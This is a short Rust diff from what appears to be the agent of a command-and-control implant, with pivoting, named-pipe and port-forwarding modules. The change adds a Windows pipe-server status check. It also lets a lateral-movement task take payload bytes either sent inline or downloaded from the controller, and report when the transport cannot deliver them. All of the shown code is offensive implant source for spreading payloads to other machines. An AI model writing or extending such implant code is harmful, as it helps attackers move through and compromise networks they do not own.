@@ -43,6 +43,11 @@ mod tcp_pivot;
 #[path = "pipe_server.rs"]
 mod pipe_server;
 
+#[cfg(target_os = "windows")]
+pub(crate) fn pipe_server_active() -> bool {
+    pipe_server::is_active()
+}
+
 #[path = "portfwd.rs"]
 mod portfwd;
 
@@ -2060,8 +2065,15 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 let self_path = std::env::current_exe().unwrap_or_default();
                 let bytes = std::fs::read(&self_path).unwrap_or_default();
                 (bytes, self_path.to_string_lossy().into_owned())
+            } else if !task.payload.is_empty() {
+                (task.payload.clone(), String::new())
             } else if !payload_name.is_empty() {
-                (t.download_file(&payload_name), String::new())
+                let bytes = t.download_file(&payload_name);
+                if bytes.is_empty() {
+                    t.send_result(task.id, "", "LATERAL: payload bytes unavailable over this transport");
+                    return;
+                }
+                (bytes, String::new())
             } else if !cmd.is_empty() {
                 (std::fs::read(&cmd).unwrap_or_default(), cmd.clone())
             } else if !json_local.is_empty() {
